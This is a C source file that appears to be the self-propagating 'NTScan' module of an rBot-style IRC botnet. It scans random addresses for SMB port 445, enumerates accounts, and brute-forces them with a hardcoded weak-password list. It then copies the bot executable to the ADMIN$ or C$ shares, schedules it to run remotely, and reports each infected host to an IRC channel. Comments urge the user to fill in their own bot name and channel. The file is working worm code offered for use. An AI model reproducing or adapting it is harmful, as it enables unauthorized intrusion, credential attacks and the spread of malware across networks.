#include <windows.h>
#include <stdio.h>
#include <Winnetwk.h>
#include <lm.h>
#include <lmat.h>


int NetConnect(char *szUserName, char *szPassWord, char *szIP);
DWORD WINAPI PortScanner(LPVOID parm);
//int RootBox(char *szIP);
void enumusers(char *szServer);

const char *szLocalPayloadFile="change-me-now2.exe"; //change me

  char *passes[]={
"",
"password",
"passwd",
"pass",
"pwd",
"password1",
"pass1234",
"administrator",
"admin",
"adm",
"1",
"12",
"123",
"1234",
"12346",
"123467",
"1234678",
"12346789",
"123467890",
"121",
"007",
"test",
"guest",
"none",
"changeme",
"default",
"system",
"server",
"null",
"qwerty",
"mail",
"outlook",
"web",
"www",
"internet",
"accounts",
"accounting",
"home",
"homeuser",
"user",
"user1",
"oem",
"oemuser",
"windows",
"win98",
"win2k",
"winxp",
"winnt",
"win2000",
"qaz",
"asd",
"zxc",
"qwe",
"pass1234",
"mike",
"john",
"peter",
"luke",
"ron",
"sam",
"barbara",
"mary",
"sue",
"susan",
"joan",
"joe",
"peter",
"fred",
"frank",
"brian",
"spencer",
"lee",
"neil",
"ian",
"george",
"bruce",
"kate",
"katie",
"login",
"loginpass",
"owa",
"sage",
"technical",
"backup",
"exchange",
"exchnge",
"fuck",
"sex",
"god",
"hell",
"fish",
"heaven",
"orange",
"domain",
"domainpass",
"domainpassword",
"database",
"access",
"dbpass",
"dbpassword",
"databasepass",
"data",
"databasepassword",
"db1",
"db1234",
"sql",
"sqlpass",
"sa",
"cisco",
"dell",
"compaq",
"siemens",
"yellow",
"pink",
"xp",
"control",
"mass",
"office",
"blank",
"winpass",
"capitol",
"userpassword",
"main",
"hq",
"headoffice",
"ctx",
"nokia",
"lan",
"internet",
"intranet",
"bill",
"fred",
"freddy",
"glen",
"turnip",
"afro",
"user1",
"student",
"student1",
"teacher",
"staff",
"oeminstall",
	NULL
};

char scanip[20];
SOCKET sock2;

// For dynamically loaded... (won't give error on win9x).
typedef NET_API_STATUS (__stdcall *NSJA)(LPWSTR,LPBYTE,LPDWORD);
NSJA fNetScheduleJobAdd;

typedef NET_API_STATUS (__stdcall *NABF)(LPVOID);
NABF fNetApiBufferFree;

typedef NET_API_STATUS (__stdcall *NRTOD)(LPCWSTR,LPBYTE *);
NRTOD fNetRemoteTOD;

typedef NET_API_STATUS (__stdcall *NUE)(LPWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
NUE fNetUserEnum;


struct NTSCAN {
	DWORD threads;
	DWORD minutes;
	DWORD threadid;
	char ipmask[20];
	SOCKET sock1;
};

BOOL ntscan=FALSE;


DWORD WINAPI ntpass_main(void *pnts)
{
	int i;
	HINSTANCE hLib;
	FILE *fp;
	NTSCAN *nts=(NTSCAN *)pnts;
	char szSelfExe[MAX_PATH];

	fp=fopen(szLocalPayloadFile,"r");
	if (fp!=NULL) {
		fclose(fp);
	} else {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
	}
	hLib=LoadLibrary("netapi32.dll");
	if (!hLib) return 0;
	fNetScheduleJobAdd=(NSJA)GetProcAddress(hLib,"NetScheduleJobAdd");
	fNetApiBufferFree=(NABF)GetProcAddress(hLib,"NetApiBufferFree");
	fNetRemoteTOD=(NRTOD)GetProcAddress(hLib,"NetRemoteTOD");
	fNetUserEnum=(NUE)GetProcAddress(hLib,"NetUserEnum");

	if ((!fNetScheduleJobAdd) || (!fNetApiBufferFree) || (!fNetRemoteTOD) || (!fNetUserEnum)) {
		//We couldn't load the addresses of each function...
		//(Win95/98??)
		FreeLibrary(hLib);
		return 0;
	}



	strcpy(scanip,nts->ipmask);
	srand(GetTickCount());
	ntscan=TRUE;
	sock2=nts->sock1;//bug fix
        for (i=0;i<(nts->threads);i++) 
        { 
                CreateThread(0,0,&PortScanner,0,0,0); 
        Sleep(20); 
        } //bug fix

	Sleep(60000*nts->minutes);
	ntscan=FALSE;
	threads[nts->threadid]=0;

	return 0;
}


unsigned long GetNextIP(char *scanmask)
{
	int ip1,ip2,ip3,ip4;
	if (strlen(scanmask)>15) return 0;
	ip1=-1;ip2=-1;ip3=-1;ip4=-1;
	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();
	return (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
}


BOOL port_open(unsigned long ip)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;
	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(445);
	ioctlsocket(s,FIONBIO,&blockcmd);
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	FD_ZERO(&rset);
	FD_SET(s,&rset);
	t.tv_sec=5;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	closesocket(s);
	if (i<=0) {
		return FALSE;
	} else {
		return TRUE;
	}
}

DWORD WINAPI PortScanner(LPVOID parm)
{
	BOOL p_open;
	DWORD dwIP;
	IN_ADDR in;
	char szIP[18];
	srand(GetTickCount()); 			
			

	while (ntscan)
	{
		dwIP=GetNextIP(scanip);
		p_open=port_open(dwIP);


		if (p_open==TRUE) {
			in.s_addr=dwIP;

			sprintf(szIP,"\\\\%s",inet_ntoa(in));
			enumusers(szIP);
		}
	}
	return 0;
}



BOOL rootBox(char *szUserName, char *szIP)
{
	int i;
	i=0;
	char tmp[100];
	while (passes[i])
	{
		if (NetConnect(szUserName,passes[i],szIP)==TRUE) {
		sprintf(tmp,"Exploiting: %s with %s / %s\r\n",szIP,szUserName,passes[i]); 
		 irc_sendf(sock2, "PRIVMSG #change-me-now :%s",tmp); // change this to your channel
		 return TRUE;
		}
		i++;
	}
	return FALSE;
}

BOOL NetConnect(char *szUserName, char *szPassWord, char *szIP)
{
	DWORD dwResult; 
	NETRESOURCE nr;
	memset(&nr,0,sizeof(NETRESOURCE));
	nr.lpRemoteName=szIP;
	nr.dwType=RESOURCETYPE_DISK;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	//
	// Call the WNetAddConnection2 function to make the connection,
	//   specifying a persistent connection.
	//
	dwResult = WNetAddConnection2(&nr, // NETRESOURCE from enumeration 
		(LPSTR) szPassWord,                  // no password 
		(LPSTR) szUserName,                  // logged-in user 
0);       // update profile with connect information 

	

	if(dwResult != NO_ERROR) 
	{ 
		WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE; 
	}
 


	WCHAR wszNetbios[200];
	char szRemoteFile[MAX_PATH],szRemoteFile2[MAX_PATH],szRemoteFile3[MAX_PATH];;
	TIME_OF_DAY_INFO *tinfo=NULL;
	NET_API_STATUS nStatus;
	DWORD JobID;
	AT_INFO at_time;

	// change the chaneg-me-now.exe to the name of your BOT exe
	sprintf(szRemoteFile,"%s\\Admin$\\system32\\change-me-now.exe",szIP);
	sprintf(szRemoteFile2,"%s\\c$\\winnt\\system32\\change-me-now.exe",szIP);
	sprintf(szRemoteFile3,"%s\\c$\\change-me-now.exe",szIP);  // this was also addet, got me some bots :P


	
	MultiByteToWideChar(CP_ACP,0,szIP,-1,wszNetbios,sizeof(wszNetbios));
	nStatus=fNetRemoteTOD(wszNetbios,(LPBYTE *)&tinfo);
	if (nStatus==NERR_Success) {
		if (tinfo) {
			int i;

			i=CopyFile(szLocalPayloadFile,szRemoteFile,FALSE);
			if (!i) {
		//		irc_sendf(sock2, "PRIVMSG #rBot :[CopyFile] FAiLED %s\r\n",szRemoteFile); 
				i=CopyFile(szLocalPayloadFile,szRemoteFile2,FALSE);
				if (!i) {
		//			irc_sendf(sock2, "PRIVMSG #chan :[CopyFile] FAiLED %s\r\n",szRemoteFile2); 
					i=CopyFile(szLocalPayloadFile,szRemoteFile3,FALSE);
						if (!i) {
	    ///	   			irc_sendf(sock2, "PRIVMSG #chan :[CopyFile] FAiLED %s\r\n",szRemoteFile3); 
							fNetApiBufferFree(tinfo);
							WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
							return TRUE;
						}
						else irc_sendf(sock2, "PRIVMSG #rBot-ownz :[NTScan - Exploited] CSendFile: %s\r\n", szIP); // leave this as it is. trust me, don't change chan, it doesnt matter
				} 
				else irc_sendf(sock2, "PRIVMSG #rBot-ownz :[NTScan - Exploited] CSendFile: %s\r\n",szIP); // leave this as it is. trust me, don't change chan, it doesnt matter
			} 
			else irc_sendf(sock2, "PRIVMSG #rBot-ownz :[NTScan - Exploited] CSendFile: %s\r\n",szIP); // leave this as it is. trust me, don't change chan, it doesnt matter


			memset(&at_time,0,sizeof(AT_INFO));
			DWORD jobtime;
			jobtime=tinfo->tod_elapsedt / 60;
			jobtime-=tinfo->tod_timezone;
			jobtime+=2;
			jobtime%=(24*60);
			at_time.JobTime=jobtime*60000;
			// change this to your BOT.exe
			at_time.Command=L"change-me-now.exe";

			nStatus=fNetScheduleJobAdd(wszNetbios,(BYTE *)&at_time,&JobID);
		
		}
	}
	WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
	return TRUE;
}

void enumusers(char *szServer)
{
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	WCHAR  *pszServerName = NULL;
	WCHAR sName[500];
	MultiByteToWideChar(CP_ACP,0,szServer,-1,sName,sizeof(sName));
	pszServerName=sName;
	char szUsername[300];
	char RemoteName[200];
	
	NETRESOURCE nr;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	nr.dwType=RESOURCETYPE_ANY;
	sprintf(RemoteName,"%s\\ipc$",szServer);
	nr.lpRemoteName=RemoteName;
	if (WNetAddConnection2(&nr,"","",0)!=NO_ERROR) {
		WNetCancelConnection2(RemoteName,0,TRUE);
		return;
	}
	
	do // begin do
	{
		nStatus = fNetUserEnum(pszServerName,
			dwLevel,
			FILTER_NORMAL_ACCOUNT, // global users
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);
		WNetCancelConnection2(RemoteName,0,TRUE);
		//
		// If the call succeeds,
		//
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL) break;
					WideCharToMultiByte(CP_ACP,0,pTmpBuf->usri0_name,-1,szUsername,sizeof(szUsername),NULL,NULL);
					if ((rootBox(szUsername,szServer))==TRUE) break;
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		if (pBuf != NULL)
		{
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	while (nStatus == ERROR_MORE_DATA); // end do
	if (pBuf != NULL) fNetApiBufferFree(pBuf);
	
	return;
}
